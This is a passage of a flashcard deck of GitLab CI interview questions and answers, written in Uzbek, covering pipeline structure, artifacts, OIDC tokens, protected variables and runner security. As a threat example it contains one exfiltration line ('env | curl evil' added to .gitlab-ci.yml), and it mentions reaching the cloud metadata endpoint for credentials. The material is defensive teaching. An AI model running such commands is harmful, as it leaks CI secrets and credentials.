--trigger--&gt; app-repo pipeline (downstream)</pre><p><b>Amalda (monorepo):</b></p><pre>billing:<br>  trigger:<br>    include: services/billing/.gitlab-ci.yml<br>    strategy: depend<br>  rules:<br>    - changes: [services/billing/**/*, pkg/**/*]<br><br># dinamik<br>generate:<br>  script: ./ci/gen.sh &gt; child.yml        # o'zgargan servislarga qarab YAML<br>  artifacts: {paths: [child.yml]}<br><br>run-child:<br>  needs: [generate]<br>  trigger:<br>    include:<br>      - artifact: child.yml<br>        job: generate<br>    strategy: depend</pre><p>Multi-project:</p><pre>deploy-app:<br>  trigger:<br>    project: acme/app<br>    branch: main<br>    strategy: depend<br>  variables:<br>    LIB_VERSION: $CI_COMMIT_TAG</pre><p><b>Qachon nima:</b></p><p>| Holat | Yechim | |---|---| | Monorepo, servislar mustaqil | parent-child + <code>rules: changes</code> | | Pipeline tuzilishi kod bilan aniqlanadi | dinamik child | | Boshqa repo'ni ishga tushirish | multi-project | | Oddiy kombinatsiyalar | <code>parallel: matrix</code> yetadi |</p><p><b>Tuzoqlar:</b></p><ul><li><code>strategy: depend</code> yo'q — parent child'ni kutmaydi va yashil bo'ladi, child fail bo'lsa ham.</li><li>Child pipeline parent o'zgaruvchilarini avtomatik olmaydi — <code>trigger: forward:</code> bilan.</li><li>Ichma-ichlik chuqurligi limiti (2 daraja child) va trigger qiluvchi foydalanuvchida downstream loyihada huquq bo'lishi kerak.</li></ul><p><b>Senior nuqta:</b> Child pipeline'lar har servisga o'z <code>.gitlab-ci.yml</code> egaligini beradi (CODEOWNERS bilan) — platforma umumiy qoidalarni parent'da, jamoalar o'z tafsilotlarini child'da boshqaradi.</p>	lvl::Middle dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-33042	<p><code>parallel</code> va <code>parallel:matrix</code> qanday ishlaydi?</p>	<p><b>Qisqa javob:</b> <code>parallel: N</code> — bitta job'ning N ta bir xil nusxasini parallel ishga tushiradi; har biri <code>CI_NODE_INDEX</code> (1..N) va <code>CI_NODE_TOTAL</code> oladi — test sharding uchun. <code>parallel: matrix</code> — o'zgaruvchilar kombinatsiyalari bo'yicha job nusxalarini yaratadi (masalan REGION x ENV), har nusxa o'z o'zgaruvchilari bilan.</p><p><b>Qanday ishlaydi:</b></p><pre>parallel: 4<br>  test 1/4  test 2/4  test 3/4  test 4/4    (CI_NODE_INDEX=1..4)<br><br>parallel: matrix [REGION: eu, us] x [ENV: stg, prod]<br>  deploy: [eu, stg]  [eu, prod]  [us, stg]  [us, prod]</pre><p><b>Amalda:</b></p><pre>test:<br>  image: golang:1.23<br>  parallel: 4<br>  script:<br>    - go list ./... | awk &quot;NR % $CI_NODE_TOTAL == $CI_NODE_INDEX - 1&quot; &gt; pkgs.txt<br>    - go test $(cat pkgs.txt)<br><br>build:<br>  parallel:<br>    matrix:<br>      - ARCH: [amd64, arm64]<br>  script: GOARCH=$ARCH go build -o app-$ARCH ./cmd/app<br>  artifacts: {paths: [&quot;app-$ARCH&quot;]}<br><br>deploy:<br>  parallel:<br>    matrix:<br>      - REGION: [eu, us]<br>        ENV: [stg, prod]<br>  script: ./deploy.sh &quot;$ENV&quot; &quot;$REGION&quot;<br>  environment: $ENV-$REGION</pre><p>Matrix job'ning aniq nusxasiga bog'lanish:</p><pre>package-amd64:<br>  needs:<br>    - job: build<br>      parallel:<br>        matrix:<br>          - ARCH: amd64<br>  script: ./package.sh app-amd64</pre><p><b>Cheklovlar:</b> bitta job uchun 200 tagacha nusxa; job nomlari <code>deploy: [eu, stg]</code> shaklida.</p><p><b>Tuzoqlar:</b></p><ul><li>Sharding fayl soni bo'yicha — bir shard'ga og'ir testlar tushib, u boshqalardan 3x uzoq; test vaqti bo'yicha taqsimla (JUnit tarixidan).</li><li>Har nusxa setup (image pull, cache restore) qiladi — juda ko'p mayda shard foydasiz.</li><li>Matrix'dagi prod deploy'lar parallel — bir vaqtda hamma region'ga chiqish xavfli; <code>resource_group</code> yoki bosqichma-bosqich.</li></ul><p><b>Senior nuqta:</b> Shard soni = (umumiy test vaqti / maqsad vaqt), lekin runner sig'imi bilan chekla. Matrix'ni deploy uchun ishlatganda region'lar orasida canary tartibini saqla.</p>	lvl::Middle dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-33043	<p><code>resource_group</code> va <code>interruptible</code> nima uchun?</p>	<p><b>Qisqa javob:</b> <code>resource_group</code> — bir xil guruhdagi job'lar bir vaqtda faqat bittadan ishlashini ta'minlaydi (mutex): ikki pipeline bir vaqtda production'ga deploy qilmaydi. <code>interruptible: true</code> — shu branch'ga yangi pipeline kelganda, eski pipeline'dagi bu job avtomatik bekor qilinishi mumkinligini bildiradi (&quot;Auto-cancel redundant pipelines&quot; bilan) — runner tejaladi.</p><p><b>Muammo (resource_group'siz):</b></p><pre>Pipeline #100 (v1.5) deploy-prod boshlandi ... sekin<br>Pipeline #101 (v1.6) deploy-prod boshlandi ... tez tugadi<br>#100 tugadi -&gt; prod'da ESKI v1.5 qoldi (yangisini bosib ketdi)</pre><p><b>Amalda:</b></p><pre>test:<br>  interruptible: true          # yangi commit kelsa eski test'ni bekor qilsa bo'ladi<br>  script: go test ./...<br><br>build:<br>  interruptible: true<br>  script: make build<br><br>deploy-prod:<br>  interruptible: false         # yarim deploy bekor qilinmasin<br>  resource_group: production   # bir vaqtda faqat bitta<br>  environment: production<br>  script: ./deploy.sh</pre><p>Navbat tartibi (API orqali sozlanadi):</p><pre>curl --request PUT --header &quot;PRIVATE-TOKEN: $T&quot; \<br>  &quot;https://gitlab.example.com/api/v4/projects/42/resource_groups/production?process_mode=newest_first&quot;</pre><p>| <code>process_mode</code> | Xatti-harakat | |---|---| | <code>unordered</code> (default) | birinchi bo'shagan oladi | | <code>oldest_first</code> | yaratilish tartibida | | <code>newest_first</code> | eng yangisi; eskilari skip — deploy uchun ko'pincha eng mantiqli | | <code>newest_ready_first</code> | eng yangi tayyori |</p><p><b>Auto-cancel qoidasi:</b> pipeline faqat hamma ishlayotgan job'lari <code>interruptible: true</code> bo'lsa (yoki hali boshlanmagan) bekor qilinadi. Bitta <code>interruptible: false</code> job ishga tushgan bo'lsa — pipeline bekor qilinmaydi.</p><p><b>Tuzoqlar:</b></p><ul><li>Deploy job'ini <code>interruptible: true</code> qilish — yangi push yarim deploy'ni uzadi.</li><li><code>resource_group</code> nomini dinamik qilmaslik (masalan <code>review</code> hamma MR uchun) — hamma review deploy'lar bir-birini kutadi; <code>review/$CI_COMMIT_REF_SLUG</code> ishlat.</li><li><code>oldest_first</code> bilan sekin navbat — eski versiyalar ketma-ket deploy qilinadi.</li></ul><p><b>Senior nuqta:</b> <code>resource_group</code> — CI darajasidagi lock; uni Terraform state lock yoki Argo sync bilan birga ishlat — har qatlam o'z poygasidan himoya qiladi.</p>	lvl::Middle dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-33044	<p><code>dependencies</code> va <code>needs:artifacts</code> — artifact oqimini qanday boshqarasiz?</p>	<p><b>Qisqa javob:</b> Default'da job oldingi stage'lardagi <b>barcha</b> job'larning artifact'larini yuklab oladi. <code>dependencies</code> (stage modelida) — qaysi job'lardan artifact olishni cheklaydi (<code>[]</code> — hech qaysidan). <code>needs</code> bilan esa artifact'lar faqat <code>needs</code> dagi job'lardan olinadi, <code>artifacts: false</code> bilan alohida o'chiriladi. Maqsad — keraksiz yuklashni kamaytirib, pipeline'ni tezlashtirish.</p><p><b>Muammo:</b></p><pre>build-frontend -&gt; 500 MB node_modules artifact<br>build-backend  -&gt; 50 MB binary<br>lint (test stage) -&gt; ikkalasini yuklaydi (550 MB) - keraksiz!<br>deploy-backend    -&gt; 500 MB frontend ham yuklanadi</pre><p><b>Amalda:</b></p><pre>lint:<br>  stage: test<br>  dependencies: []              # artifact kerak emas<br>  script: make lint<br><br>unit-backend:<br>  stage: test<br>  dependencies: [build-backend] # faqat backend<br>  script: ./run-tests.sh<br><br>deploy-backend:<br>  stage: deploy<br>  needs:<br>    - job: build-backend<br>      artifacts: true           # binary kerak<br>    - job: unit-backend<br>      artifacts: false          # faqat tugashini kutish<br>  script: ./deploy.sh dist/app</pre><p>Artifact o'zi uchun:</p><pre>build-backend:<br>  script: go build -o dist/app ./cmd/app<br>  artifacts:<br>    paths: [dist/app]<br>    expire_in: 3 days           # saqlash muddati<br>    when: on_success</pre><p><b><code>dependencies</code> va <code>needs</code>:</b></p><p>| | <code>dependencies</code> | <code>needs</code> | |---|---|---| | Bajarilish tartibi | o'zgarmaydi (stage) | DAG, erta boshlanadi | | Artifact | ro'yxatdagilardan | needs'dagilardan (<code>artifacts: false</code> bilan o'chirish) | | Birga | <code>needs</code> bo'lsa <code>dependencies</code> ham uning ichidan bo'lishi kerak |</p><p><b>Tuzoqlar:</b></p><ul><li><code>dependencies</code> dagi job artifact'i muddati o'tgan — job &quot;artifacts expired&quot; bilan fail.</li><li><code>needs: []</code> bilan artifact kerak bo'lgan job — hech narsa olmaydi.</li><li><code>expire_in</code> yo'q — artifact'lar instance default'igacha saqlanib storage to'ladi.</li><li>Test hisobotlari (<code>reports: junit</code>) va oddiy artifact'larni aralashtirish — hisobotlar ham har job'ga yuklanadi.</li></ul><p><b>Senior nuqta:</b> Artifact oqimini pipeline grafidek loyihala: har artifact'ning bitta yaratuvchisi va aniq iste'molchilari bo'lsin. Katta artifact'lar uchun registry (image, package) yaxshiroq tashuvchi.</p>	lvl::Middle dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-33045	<p><code>!reference</code> tag va YAML anchor farqi?</p>	<p><b>Qisqa javob:</b> YAML anchor (<code>&amp;</code> / <code>*</code> / <code>&lt;&lt;: *</code>) — standart YAML xususiyati, faqat bitta fayl ichida ishlaydi va massivlarni birlashtirmaydi. <code>extends</code> — GitLab'ning job darajasidagi meros mexanizmi, <code>include</code> qilingan fayllar orasida ham ishlaydi (hash'larni chuqur birlashtiradi, massivlarni almashtiradi). <code>!reference [job, key]</code> — GitLab'ning maxsus tag'i: boshqa job'ning aniq bir bo'lagini (masalan <code>script</code> yoki <code>rules</code>) joylashtiradi, fayllar orasida ham ishlaydi va massiv ichiga qo'shish imkonini beradi.</p><p><b>Taqqoslash:</b></p><p>| | YAML anchor | <code>extends</code> | <code>!reference</code> | |---|---|---|---| | Fayllar orasida | yo'q | ha | ha | | Daraja | ixtiyoriy tugun | butun job | aniq kalit | | Massiv | almashtiradi | almashtiradi | ichiga qo'shish mumkin | | Ichma-ich | — | ha | 10 darajagacha |</p><p><b>Amalda:</b></p><pre>.setup:<br>  script:<br>    - go mod download<br>    - go install gotest.tools/gotestsum@latest<br><br>.mr-rules:<br>  rules:<br>    - if: $CI_PIPELINE_SOURCE == &quot;merge_request_event&quot;<br><br>test:<br>  script:<br>    - !reference [.setup, script]     # 2 ta buyruq shu yerga<br>    - gotestsum ./...<br>  rules:<br>    - !reference [.mr-rules, rules]<br>    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH</pre><p>YAML anchor (faqat shu faylda):</p><pre>.defaults: &amp;defaults<br>  image: golang:1.23<br>  tags: [docker]<br><br>lint:<br>  &lt;&lt;: *defaults<br>  script: make lint</pre><p><code>extends</code> bilan nima bo'lardi:</p><pre>test:<br>  extends: .setup<br>  script: [gotestsum ./...]   # .setup script'i ALMASHTIRILADI, qo'shilmaydi</pre><p><b>Tuzoqlar:</b></p><ul><li>Anchor'ni <code>include</code> qilingan fayldagi tugunga ishlatish — ishlamaydi.</li><li><code>extends</code> bilan <code>script</code> &quot;qo'shilmoqchi&quot; bo'lish — oldingi buyruqlar yo'qoladi.</li><li><code>!reference</code> dagi kalit yo'q — pipeline yaratilmaydi (lint xatosi).</li></ul><p><b>Senior nuqta:</b> Odatiy qoida: butun job shabloni uchun <code>extends</code>, umumiy <code>script</code>/<code>rules</code> bo'laklari uchun <code>!reference</code>, anchor'lardan qochish (GitLab'ga xos imkoniyatlar aniqroq va fayllararo ishlaydi).</p>	lvl::Middle dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-33046	<p>Scheduled pipeline va pipeline trigger token qanday ishlatiladi?</p>	<p><b>Qisqa javob:</b> Scheduled pipeline — loyiha sozlamalarida cron bilan berilgan jadval bo'yicha avtomatik pipeline (<code>CI_PIPELINE_SOURCE == &quot;schedule&quot;</code>); har jadvalga o'z o'zgaruvchilari beriladi. Pipeline trigger token — tashqi tizim API orqali pipeline ishga tushirishi uchun maxsus token (<code>CI_PIPELINE_SOURCE == &quot;trigger&quot;</code>), o'zgaruvchilar bilan.</p><p><b>Schedule:</b></p><ul><li>UI: Build -&gt; Pipeline schedules -&gt; <code>0 2 * * *</code>, timezone, branch <code>main</code>, o'zgaruvchi <code>SUITE=e2e</code>.</li><li>Yoki API/Terraform (<code>gitlab_pipeline_schedule</code> resursi) — kod sifatida.</li></ul><pre>nightly-e2e:<br>  rules:<br>    - if: $CI_PIPELINE_SOURCE == &quot;schedule&quot; &amp;&amp; $SUITE == &quot;e2e&quot;<br>  script: make e2e<br><br>dependency-scan-weekly:<br>  rules:<br>    - if: $CI_PIPELINE_SOURCE == &quot;schedule&quot; &amp;&amp; $SUITE == &quot;deps&quot;<br>  script: ./scan-deps.sh<br><br>unit:<br>  rules:<br>    - if: $CI_PIPELINE_SOURCE != &quot;schedule&quot;   # jadvalda oddiy testlar ishlamasin<br>  script: go test ./...</pre><p><b>Trigger token:</b></p><pre>curl --request POST \<br>  --form token=&quot;$TRIGGER_TOKEN&quot; \<br>  --form ref=main \<br>  --form &quot;variables[ENV]=stg&quot; \<br>  &quot;https://gitlab.example.com/api/v4/projects/42/trigger/pipeline&quot;</pre><p>Boshqa GitLab pipeline'idan esa token o'rniga <code>trigger: project:</code> yoki <code>CI_JOB_TOKEN</code> ishlatish yaxshiroq.</p><p><b>Muhim nuans — egalik:</b> Schedule pipeline'i jadval egasi (owner) foydalanuvchi nomidan va uning huquqlari bilan ishlaydi; trigger token ham uni yaratgan foydalanuvchiga bog'liq. U kompaniyadan ketsa yoki bloklansa — schedule/trigger to'xtaydi (va deaktivatsiya qilingan holda ham xavf).</p><p><b>Tuzoqlar:</b></p><ul><li>Schedule egasi — odam; ketganda tungi e2e'lar jimgina to'xtaydi. Service account yoki bot foydalanuvchiga o'tkaz va egasini muntazam tekshir.</li><li>Trigger token'ni skriptlarda ochiq saqlash — u bilan pipeline (va protected branch'da protected secret'lar) ishga tushiriladi; secret sifatida saqla va rotatsiya qil.</li><li><code>workflow:rules</code> schedule'ni hisobga olmasa — pipeline umuman yaratilmaydi.</li><li>Bir vaqtga ko'p schedule (hamma 00:00 da) — runner navbati tirbandligi; vaqtlarni tarqat.</li></ul><p><b>Senior nuqta:</b> Jadvallarni IaC'da (Terraform GitLab provider) boshqar — kim, qaysi branch, qaysi o'zgaruvchilar bilan — UI'da yashirin qolmasin va review'dan o'tsin.</p>	lvl::Middle dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-32025	<p>Protected branch/variable modeli qanday xavfsizlik beradi va qayerda teshik bor?</p>	<p><b>Qisqa javob:</b> Model: protected branch'larga faqat ruxsat etilganlar (odatda Maintainer) push/merge qiladi; protected variable'lar faqat protected branch/tag pipeline'larida beriladi. Shunda prod secret'lari faqat review qilingan koddan ishlaydi. Teshik: Developer <code>.gitlab-ci.yml</code> ni o'zgartira oladi = o'z branch'ida istalgan kodni runner'da bajaradi; agar prod secret protected bo'lmasa, yoki shared runner'da credential qolsa, yoki protected branch'ga merge nazoratsiz bo'lsa — himoya buziladi.</p><p><b>Qanday ishlaydi:</b></p><pre>feature-x (unprotected) pipeline:<br>  Developer .gitlab-ci.yml ga &quot;env | curl evil&quot; yozdi<br>  -&gt; protected variable'lar YO'Q -&gt; faqat oddiy variable'lar sizadi<br><br>main (protected) pipeline:<br>  faqat MR approval'dan keyin -&gt; protected PROD_TOKEN beriladi</pre><p><b>Teshiklar va yopish:</b></p><p>| Teshik | Yopish | |---|---| | Prod secret oddiy (unprotected) variable | Protected + Masked and hidden | | Developer protected branch'ga merge qila oladi | Allowed to merge: Maintainers, MR approval rules | | <code>.gitlab-ci.yml</code> o'zgarishi review'siz | CODEOWNERS: <code>.gitlab-ci.yml @platform</code> + code owner approval | | Protected tag'lar sozlanmagan | <code>v*</code> tag — faqat Maintainer | | Shared runner'da oldingi job qoldiqlari | ephemeral executor, prod deploy uchun alohida runner | | Security scan'ni olib tashlash | pipeline execution policy | | Masking chetlab o'tiladi (<code>echo $X | base64</code>) | secret'ni umuman bermaslik: OIDC, Vault |</p><p><b>Amalda (prod deploy):</b></p><pre>deploy-prod:<br>  environment: production         # protected environment + approval<br>  tags: [prod-deployer]           # faqat protected ref'larni oladigan runner<br>  rules:<br>    - if: $CI_COMMIT_TAG =~ /^v\d+/<br>  id_tokens:<br>    VAULT_ID_TOKEN: {aud: https://vault.example.com}<br>  secrets:<br>    DB_PASSWORD:<br>      vault: prod/db/password@kv</pre><p>Runner'ni faqat protected ref'lar uchun sozlash: runner sozlamasida &quot;Protected&quot; belgisi.</p><p><b>Tuzoqlar:</b></p><ul><li>&quot;Masked = xavfsiz&quot; — mask faqat log'dagi aniq qiymatni yashiradi, o'zgartirilganini emas.</li><li>Fork MR pipeline'lari parent loyihada ishga tushirilsa (maintainer &quot;Run pipeline&quot; bosgan) — fork kodi parent secret'lari bilan; avval kodni ko'rib chiq.</li></ul><p><b>Senior nuqta:</b> Asosiy savol: &quot;Kim prod secret'li pipeline'da kod bajara oladi?&quot; Javob &quot;faqat review qilingan protected ref&quot; bo'lishi va buni runner, variable, environment va approval qatlamlari birga ta'minlashi kerak.</p>	lvl::Senior dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-32026	<p><code>CI_JOB_TOKEN</code> va OIDC <code>id_tokens</code> qanday ishlatiladi?</p>	<p><b>Qisqa javob:</b> <code>CI_JOB_TOKEN</code> — har job uchun avtomatik, qisqa muddatli token: GitLab API'ning cheklangan qismiga (boshqa loyihaning package/registry, artifact, trigger) job'ni ishga tushirgan foydalanuvchi huquqlari doirasida kirish uchun. <code>id_tokens</code> — job uchun OIDC JWT chiqaradi; tashqi tizimlar (AWS, GCP, Azure, Vault) uni qabul qilib, vaqtinchalik credential beradi — CI'da uzoq yashovchi cloud kaliti kerak bo'lmaydi.</p><p><b>OIDC oqimi:</b></p><pre>job (id_tokens: AWS_TOKEN aud=sts.amazonaws.com)<br>  JWT claim'lari: sub=project_path:grp/app:ref_type:branch:ref:main<br>                  project_path, ref, ref_protected, environment ...<br>  -&gt; AWS STS AssumeRoleWithWebIdentity<br>     trust policy: sub mosmi?<br>  -&gt; 1 soatlik credential</pre><p><b>Amalda:</b></p><pre>deploy:<br>  image: amazon/aws-cli:2.17.0<br>  id_tokens:<br>    AWS_TOKEN:<br>      aud: sts.amazonaws.com<br>  script:<br>    - &gt;<br>      export $(printf &quot;AWS_ACCESS_KEY_ID=%s AWS_SECRET_ACCESS_KEY=%s AWS_SESSION_TOKEN=%s&quot;<br>      $(aws sts assume-role-with-web-identity<br>      --role-arn &quot;$ROLE_ARN&quot; --role-session-name &quot;gl-$CI_JOB_ID&quot;<br>      --web-identity-token &quot;$AWS_TOKEN&quot; --duration-seconds 3600<br>      --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text))<br>    - aws sts get-caller-identity</pre><p>AWS trust policy sharti:</p><pre>&quot;Condition&quot;: {&quot;StringEquals&quot;: {<br>  &quot;gitlab.example.com:aud&quot;: &quot;sts.amazonaws.com&quot;,<br>  &quot;gitlab.example.com:sub&quot;: &quot;project_path:grp/app:ref_type:branch:ref:main&quot;}}</pre><p><b>CI_JOB_TOKEN ishlatish:</b></p><pre>curl --header &quot;JOB-TOKEN: $CI_JOB_TOKEN&quot; \<br>  &quot;$CI_API_V4_URL/projects/99/packages/generic/lib/1.2.0/lib.tar.gz&quot; -o lib.tar.gz</pre><p>Boshqa loyiha kirishiga ruxsat: o'sha loyihada Settings -&gt; CI/CD -&gt; Job token permissions -&gt; allowlist'ga qo'shish (default: faqat allowlist'dagi loyihalar).</p><p><b>Tuzoqlar:</b></p><ul><li><code>sub</code> sharti keng (<code>project_path:grp/*</code>) yoki <code>StringLike</code> bilan <code>*</code> — har qanday branch, hatto feature branch prod rolini oladi.</li><li>Prod uchun <code>ref_protected: &quot;true&quot;</code> claim'ini tekshirmaslik.</li><li>Job token allowlist'ni &quot;hammaga ochiq&quot; qilish (eski default) — har loyiha job'i kirishi mumkin.</li></ul><p><b>Senior nuqta:</b> Prod rolini <code>ref</code> va <code>environment</code> claim'lariga bog'la va protected environment approval bilan birlashtir — OIDC shunda faqat review qilingan, tasdiqlangan deploy'ga ochiladi.</p>	lvl::Senior dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-32027	<p>Katta monorepo'da GitLab pipeline'ni qanday tezlashtirasiz?</p>	<p><b>Qisqa javob:</b> Avval o'lcha (critical path qaysi job'lar), keyin: faqat o'zgargan qismlarni ishga tushir (<code>rules: changes</code> + <code>compare_to</code>, parent-child), stage to'siqlarini <code>needs</code> bilan olib tashla, testlarni <code>parallel</code> bilan shard qil, cache'ni to'g'ri sozla (<code>key: files</code>, <code>policy: pull</code>), tayyor CI image'lar va Docker layer cache ishlat, eski pipeline'larni <code>interruptible</code> bilan bekor qil.</p><p><b>Qayerdan vaqt ketadi:</b></p><pre>har commit'da 40 servis build    -&gt; faqat o'zgarganlar (changes)<br>stage barrier: lint 10m kutadi   -&gt; needs: [] / DAG<br>1 ta 30 daqiqalik test job       -&gt; parallel: 6 shard<br>har job apt-get install ...      -&gt; prebuilt CI image<br>har job go mod download          -&gt; cache key=go.sum, policy: pull<br>eski commit pipeline'lari        -&gt; interruptible + auto-cancel</pre><p><b>Amalda:</b></p><pre>.billing-changes:<br>  rules:<br>    - changes:<br>        paths: [services/billing/**/*, pkg/**/*, go.mod]<br>        compare_to: refs/heads/main<br><br>billing-build:<br>  extends: .billing-changes<br>  needs: []<br>  image: registry.example.com/ci/go:1.23     # oldindan tayyorlangan image<br>  cache:<br>    key: {files: [go.sum]}<br>    paths: [.go/pkg/mod]<br>    policy: pull                              # faqat o'qiydi<br>  interruptible: true<br>  script: make -C services/billing build<br><br>billing-test:<br>  extends: .billing-changes<br>  needs: [billing-build]<br>  parallel: 4<br>  interruptible: true<br>  script: make -C services/billing test SHARD=$CI_NODE_INDEX/$CI_NODE_TOTAL<br><br>warm-cache:                                   # cache'ni faqat shu yozadi<br>  rules: [{if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH}]<br>  cache: {key: {files: [go.sum]}, paths: [.go/pkg/mod], policy: push}<br>  script: go mod download</pre><p><b>O'lchash:</b> CI/CD Analytics (pipeline duration), job'lar bo'yicha vaqt (API: <code>/pipelines/:id/jobs</code>), runner queue duration.</p><p><b>Tuzoqlar:</b></p><ul><li><code>changes</code> shared kutubxona (<code>pkg/</code>) o'zgarishini o'tkazib yuboradi — dependency grafini filter'ga kirit, yoki Bazel/Nx kabi graf asosidagi tool.</li><li>Runner yetishmasa parallellik foyda bermaydi — queue time o'sadi.</li><li>Cache juda katta — restore build'dan sekin.</li></ul><p><b>Senior nuqta:</b> Maqsad metrikasi — MR'dan natijagacha p50/p95 vaqt. Har optimizatsiyadan oldin va keyin o'lcha; ko'pincha eng katta yutuq <code>needs</code> va prebuilt image'dan keladi.</p>	lvl::Senior dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-32028	<p>Merge train va merged results pipeline nima muammoni yechadi?</p>	<p><b>Qisqa javob:</b> Muammo — semantik konflikt: A va B MR'lar alohida yashil, lekin main'ga birga tushganda buziladi (biri funksiya imzosini o'zgartirdi, ikkinchisi eski imzo bilan yangi chaqiruv qo'shdi). Merged results pipeline MR'ni source branch'da emas, source + target birlashtirilgan vaqtinchalik commit'da tekshiradi. Merge train esa navbatdagi MR'larni ketma-ket birlashtirib (A, A+B, A+B+C) parallel tekshiradi va faqat yashillarini tartib bilan merge qiladi.</p><p><b>Merge train:</b></p><pre>train: [A] [B] [C]<br>  pipeline 1: main + A<br>  pipeline 2: main + A + B        (parallel)<br>  pipeline 3: main + A + B + C<br>A yashil -&gt; merge; B qizil -&gt; B train'dan chiqadi,<br>  C uchun qayta: main + A + C</pre><p><b>Amalda:</b></p><ul><li>Settings -&gt; Merge requests -&gt; &quot;Enable merged results pipelines&quot; va &quot;Enable merge trains&quot;.</li><li>Pipeline'lar MR pipeline bo'lishi kerak:</li></ul><pre>workflow:<br>  rules:<br>    - if: $CI_PIPELINE_SOURCE == &quot;merge_request_event&quot;<br>    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH<br><br>e2e:<br>  rules:<br>    - if: $CI_MERGE_REQUEST_EVENT_TYPE == &quot;merge_train&quot;   # og'ir testlar faqat train'da<br>  script: make e2e</pre><p><code>CI_MERGE_REQUEST_EVENT_TYPE</code>: <code>detached</code>, <code>merged_result</code>, <code>merge_train</code>.</p><p><b>Trade-off'lar:</b></p><p>| Foyda | Narx | |---|---| | main doim yashil | runner sarfi oshadi (har train pozitsiyasi pipeline) | | rebase-and-retest qo'lda yo'q | flaky test butun train'ni qayta qurdiradi | | ko'p jamoali repo'da tez merge | pipeline vaqti uzun bo'lsa train sekin harakatlanadi |</p><p><b>Tuzoqlar:</b></p><ul><li>Flaky testlar — train doimiy qayta quriladi; avval flaky'ni tuzat yoki quarantine.</li><li>Pipeline'lar MR pipeline emas (faqat branch) — train ishlamaydi.</li><li>Merged results commit vaqtinchalik — undan image build qilib deploy qilish noto'g'ri; deploy main'dagi haqiqiy commit'dan.</li></ul><p><b>Senior nuqta:</b> GitHub'dagi analogi — merge queue. Ikkalasida ham qoida bir xil: tez check'lar MR'da (feedback), qimmat testlar train'da (kafolat), flaky rate past bo'lishi shart.</p>	lvl::Senior dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-32029	<p>Shared runner'larda job izolyatsiyasi va supply chain xavflari?</p>	<p><b>Qisqa javob:</b> Shared runner'da turli loyihalar, ba'zan ishonchsiz kod, bir infratuzilmada ishlaydi. Asosiy xavflar: privileged konteyner (DinD) orqali host'ni egallash, job'lar orasida qolgan fayl/credential, runner'ning cloud roli orqali kirish, va supply chain (o'zgaruvchan image tag'lar, tashqi registry, zararli dependency). Yechim: ephemeral izolyatsiya, privileged'siz build, alohida prod runner'lar, pin qilingan image'lar, dependency proxy va imzolangan artifact'lar.</p><p><b>Xavf xaritasi:</b></p><pre>job (ishonchsiz kod)<br>  |-- privileged + DinD -&gt; /dev, kernel -&gt; HOST ROOT<br>  |-- persistent runner  -&gt; oldingi job'ning ~/.docker/config.json, cache<br>  |-- node IAM roli      -&gt; IMDS 169.254.169.254 -&gt; cloud credential<br>  |-- image: golang:latest -&gt; registry'da tag almashtirilgan<br>  |-- go get / npm install -&gt; typosquatting paket</pre><p><b>Choralar:</b></p><p>| Xavf | Chora | |---|---| | privileged DinD | Buildah / BuildKit rootless, alohida build node pool | | job qoldiqlari | kubernetes yoki docker-autoscaler executor, har job yangi pod/VM | | node roli | IMDS'ni bloklash, cloud'ga faqat <code>id_tokens</code> (OIDC) | | prod credential | alohida runner, <code>tags: [prod]</code>, faqat protected ref | | image tag | digest bilan pin: <code>golang:1.23@sha256:...</code> | | tashqi registry | Dependency Proxy / ichki mirror, allowlist | | artifact soxtaligi | cosign imzo, SLSA provenance |</p><p><b>Amalda (runner <code>config.toml</code> parchasi):</b></p><pre>[[runners]]<br>  executor = &quot;kubernetes&quot;<br>  [runners.kubernetes]<br>    privileged = false<br>    allowed_images = [&quot;registry.example.com/ci/*&quot;, &quot;golang:*&quot;]<br>    namespace = &quot;ci-jobs&quot;<br>    [runners.kubernetes.pod_security_context]<br>      run_as_non_root = true</pre><pre>build:<br>  image: golang:1.23@sha256:&lt;digest&gt;<br>  script:<br>    - go build ./...</pre><p>GitLab Dependency Proxy: <code>image: ${CI_DEPENDENCY_PROXY_GROUP_IMAGE_PREFIX}/golang:1.23</code>.</p><p><b>Tuzoqlar:</b></p><ul><li>&quot;Faqat ichki jamoa ishlatadi&quot; — buzilgan dasturchi akkaunti yoki zararli dependency ham ichkaridan keladi.</li><li>CI pod'lariga cluster ichida cheklanmagan tarmoq — NetworkPolicy bilan egress'ni chekla.</li><li>Runner token'i (<code>glrt-</code>) sizsa — hujumchi o'z runner'ini ro'yxatdan o'tkazib job'larni (va secret'larni) tutib oladi; token'ni rotatsiya qil.</li></ul><p><b>Senior nuqta:</b> CI runner — ishonchsiz kodni bajaradigan production tizim. Unga shunday munosabat: izolyatsiya chegarasi, minimal huquq, audit va muntazam patch.</p>	lvl::Senior dom::cicd sec::i9 GitLab_CI
